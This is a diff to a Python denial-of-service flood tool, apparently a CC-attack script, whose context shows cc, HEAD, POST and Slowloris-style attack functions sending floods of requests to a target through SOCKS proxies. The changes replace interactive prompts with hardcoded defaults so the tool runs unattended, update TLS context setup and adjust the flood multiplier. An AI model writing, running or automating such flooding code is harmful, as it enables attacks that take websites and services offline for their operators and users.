@@ -189,7 +189,8 @@ def ParseUrl(original_url):
 def InputOption(question, options, default):
     ans = ""
     while ans == "":
-        ans = str(input(question)).strip().lower()
+        # ans = str(input(question)).strip().lower()
+        ans = ""
         if ans == "":
             ans = default
         elif ans not in options:
@@ -201,13 +202,15 @@ def InputOption(question, options, default):
 
 def CheckerOption():
     global proxies
-    N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+    # N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+    N = 'y'
     if N == 'y' or N == "":
         downloadsocks(choice)
     else:
         pass
     if choice == "4":
-        out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+        # out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+        out_file = ""
         if out_file == '':
             out_file = str("socks4.txt")
         else:
@@ -215,7 +218,8 @@ def CheckerOption():
         check_list(out_file)
         proxies = open(out_file).readlines()
     elif choice == "5":
-        out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+        # out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+        out_file = ''
         if out_file == '':
             out_file = str("socks5.txt")
         else:
@@ -227,11 +231,13 @@ def CheckerOption():
         sys.exit(1)
     print("> Number Of Socks%s Proxies: %s" % (choice, len(proxies)))
     time.sleep(0.03)
-    ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+    # ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+    ans = ""
     if ans == "":
         ans = "y"
     if ans == "y":
-        ms = str(input("> Delay of socks(seconds, default=5):"))
+        # ms = str(input("> Delay of socks(seconds, default=5):"))
+        ms = ""
         if ms == "":
             ms = int(5)
         else:
@@ -303,7 +309,7 @@ def cc(event, socks_type, ind_rlock):
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext()
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
                 for n in range(multiple + 1):
@@ -345,7 +351,7 @@ def head(event, socks_type, ind_rlock):  #HEAD MODE
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext()
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
                 for n in range(multiple + 1):
@@ -384,7 +390,7 @@ def post(event, socks_type, ind_rlock):
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext()
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
                 for n in range(multiple + 1):
@@ -420,7 +426,7 @@ def slow(conn, socks_type):
             s.settimeout(1)
             s.connect((str(target), int(port)))
             if str(port) == '443':
-                ctx = ssl.SSLContext()
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 s = ctx.wrap_socket(s, server_hostname=target)
             s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))  # Slowloris format header
             s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
@@ -458,7 +464,7 @@ def slow(conn, socks_type):
                 s.settimeout(1)
                 s.connect((str(target), int(port)))
                 if int(port) == 443:
-                    ctx = ssl.SSLContext()
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                     s = ctx.wrap_socket(s, server_hostname=target)
                 s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))  # Slowloris format header
                 s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
@@ -504,7 +510,7 @@ def checking(lines, socks_type, ms, rlock, ):  #Proxy checker coded by BlueSkyXN
             s.settimeout(ms)
             s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext()
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                 s = ctx.wrap_socket(s, server_hostname=target)
             sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
             if not sent:
@@ -536,7 +542,8 @@ def check_socks(ms):  #Coded by BlueSkyXN
         sys.stdout.write("> Checked " + str(nums) + " proxies\r")
         sys.stdout.flush()
     print("\r\n> Checked all proxies, Total Worked:" + str(len(proxies)))
-    ans = input("> Do u want to save them in a file? (y/n, default=y)")
+    # ans = input("> Do u want to save them in a file? (y/n, default=y)")
+    ans = ""
     if ans == "y" or ans == "":
         if choice == "4":
             with open("socks4.txt", 'wb') as fp:
@@ -776,7 +783,7 @@ def easyMain():
         th.setDaemon(True)
         th.start()
     else:
-        multiple = 1000  # 默认放大倍数 100
+        multiple = 100  # 默认放大倍数 100
         brute = True  # 默认不启用 Boost 模式
 
         event = threading.Event()
